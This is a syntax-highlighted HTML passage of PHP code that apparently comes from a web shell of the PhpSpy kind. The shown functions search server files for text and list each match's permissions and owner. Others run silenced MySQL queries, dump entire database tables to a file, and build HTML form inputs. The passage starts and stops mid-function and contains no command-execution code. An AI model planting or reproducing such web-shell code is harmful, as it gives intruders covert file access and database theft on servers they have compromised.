<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">find</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ( <span style="color: #4d4d4c; background-color: #ffffff;">strstr(</span>$<span style="color: #eab700;">file</span>, $<span style="color: #eab700;">content</span>) || <span style="color: #4d4d4c; background-color: #ffffff;">strstr(</span> @<span style="color: #4d4d4c; background-color: #ffffff;">file_get_contents(</span>$<span style="color: #eab700; text-decoration: underline;">f</span><span style="text-decoration: underline;">),$</span><span style="color: #eab700; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">find</span> = <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">find</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'filename'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span>$<span style="color: #eab700;">nowpath</span>,<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'size'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">f</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'mtime'</span>]=<span style="color: #718c00;">@date</span>(<span style="color: #3e999f;">'Y-m-d H:i:s'</span>,<span style="color: #4d4d4c; background-color: #ffffff;">filemtime(</span>$<span style="color: #eab700;">f</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'filechmod'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getChmod(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'fileperm'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getPerms(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'fileowner'</span>]=<span style="color: #4d4d4c; background-color: #ffffff;">getUser(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'dirlink'</span>]=$<span style="color: #eab700;">dir</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">filedata</span>[$<span style="color: #eab700;">j</span>][<span style="color: #3e999f;">'server_link'</span>]=$<span style="color: #eab700;">f</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">j</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">closedir(</span>$<span style="color: #eab700;">dh</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">clearstatcache(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">filedata</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">qy</span>($<span style="color: #eab700;">sql</span>) {<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">mysqllink</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = $<span style="color: #eab700;">error</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #eab700;">res</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_query(</span>$<span style="color: #eab700;">sql</span>,$<span style="color: #eab700;">mysqllink</span>)) {<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> <span style="color: #718c00;">if</span>(<span style="color: #4d4d4c; background-color: #ffffff;">is_resource(</span>$<span style="color: #eab700;">res</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">1</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">2</span>;
<span style="background-color: #d6d6d6;"> </span>   }<span style="color: #c82829; background-color: #d6d6d6;">   </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">q</span>($<span style="color: #eab700;">sql</span>) {<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">mysqllink</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_query(</span>$<span style="color: #eab700;">sql</span>,$<span style="color: #eab700;">mysqllink</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">fr</span>($<span style="color: #eab700;">qy</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">mysql_free_result(</span>$<span style="color: #eab700;">qy</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">sizecount</span>($<span style="color: #eab700;">fileSize</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">size</span> = <span style="color: #4d4d4c; background-color: #ffffff;">sprintf(</span><span style="color: #3e999f;">"%u"</span>, $<span style="color: #eab700;">fileSize</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">size</span> == <span style="color: #4d4d4c; background-color: #ffffff;">0</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #3e999f;">'0 Bytes'</span> ;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">sizename</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span><span style="color: #3e999f;">' Bytes'</span>, <span style="color: #3e999f;">' KB'</span>, <span style="color: #3e999f;">' MB'</span>, <span style="color: #3e999f;">' GB'</span>, <span style="color: #3e999f;">' TB'</span>, <span style="color: #3e999f;">' PB'</span>, <span style="color: #3e999f;">' EB'</span>, <span style="color: #3e999f;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #3e999f; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">round(</span> $<span style="color: #eab700;">size</span> / <span style="color: #4d4d4c; background-color: #ffffff;">pow(1024</span>, ($<span style="color: #eab700;">i</span> = <span style="color: #4d4d4c; background-color: #ffffff;">floor(log(</span>$<span style="color: #eab700;">size</span>, <span style="color: #4d4d4c; background-color: #ffffff;">1024</span>)))), <span style="color: #4d4d4c; background-color: #ffffff;">2</span>) . $<span style="color: #eab700;">sizen</span><span style="color: #eab700; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[$</span><span style="color: #eab700; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">sqldumptable</span>($<span style="color: #eab700;">table</span>, $<span style="color: #eab700;">fp</span>=<span style="color: #4d4d4c; background-color: #ffffff;">0</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">mysqllink</span>;

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledump</span> = <span style="color: #3e999f;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">create</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_row(</span>$<span style="color: #eab700;">res</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledump</span> .= $<span style="color: #eab700;">create</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>].<span style="color: #3e999f;">";\n\n"</span>;

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">fp</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">fp</span>,$<span style="color: #eab700;">tabledump</span>);
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">tabledump</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledump</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">rows</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SELECT * FROM $table"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span> ($<span style="color: #eab700;">row</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_assoc(</span>$<span style="color: #eab700;">rows</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span>($<span style="color: #eab700;">row</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">k</span>=&gt;$<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">row</span>[$<span style="color: #eab700;">k</span>] = <span style="color: #3e999f;">"'"</span>.@<span style="color: #4d4d4c; background-color: #ffffff;">mysql_real_escape_string(</span>$<span style="color: #eab700;">v</span>).<span style="color: #3e999f;">"'"</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledump</span> = <span style="color: #3e999f;">'INSERT INTO `'</span>.$<span style="color: #eab700;">table</span>.<span style="color: #3e999f;">'` VALUES ('</span>.<span style="color: #4d4d4c; background-color: #ffffff;">implode(</span><span style="color: #3e999f;">", "</span>, $<span style="color: #eab700;">row</span>).<span style="color: #3e999f;">');</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">fp</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">fp</span>,$<span style="color: #eab700;">tabledump</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">tabledump</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fwrite(</span>$<span style="color: #eab700;">fp</span>,<span style="color: #3e999f;">"\n\n"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fr(</span>$<span style="color: #eab700;">rows</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">p</span>($<span style="color: #eab700;">str</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> $<span style="color: #eab700;">str</span>.<span style="color: #3e999f;">"\n"</span>;
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">tbhead</span>() {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">tbfoot</span>(){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/table&gt;'</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">makehide</span>($<span style="color: #eab700;">name</span>,$<span style="color: #eab700;">value</span>=<span style="color: #3e999f;">''</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">makeinput</span>($<span style="color: #eab700;">arg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>)){
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'size'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'size'</span>] &gt; <span style="color: #4d4d4c; background-color: #ffffff;">0</span> ? <span style="color: #3e999f;">"size=\"$arg[size]\""</span> : <span style="color: #3e999f;">"size=\"100\""</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'extra'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'extra'</span>] ? $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'extra'</span>] : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   !$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'type'</span>] &amp;&amp; $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'type'</span>] = <span style="color: #3e999f;">'text'</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] ? $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>].<span style="color: #3e999f;">'&lt;br /&gt;'</span> : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'class'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'class'</span>] ? $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'class'</span>] : <span style="color: #3e999f;">'input'</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'newline'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #3e999f; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #3e999f; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   }
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">makeselect</span>($<span style="color: #eab700;">arg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>)){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'onchange'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">onchange</span> = <span style="color: #3e999f;">'onchange="'</span>.$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'onchange'</span>].<span style="color: #3e999f;">'"'</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] = $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] ? $<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'title'</span>] : <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'newline'</span>]) <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;p&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #3e999f; text-decoration: underline;"> $onchange&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_array(</span>$<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'option'</span>])) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'nokey'</span>]) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'option'</span>] <span style="color: #718c00;">as</span> $<span style="color: #eab700;">value</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'selected'</span>]==$<span style="color: #eab700;">value</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'option'</span>] <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span>=&gt;$<span style="color: #eab700;">value</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'selected'</span>]==$<span style="color: #eab700;">key</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;/select&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">arg</span>[<span style="color: #3e999f;">'newline'</span>]) <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/p&gt;'</span>);
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">formhead</span>($<span style="color: #eab700;">arg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">self</span>;
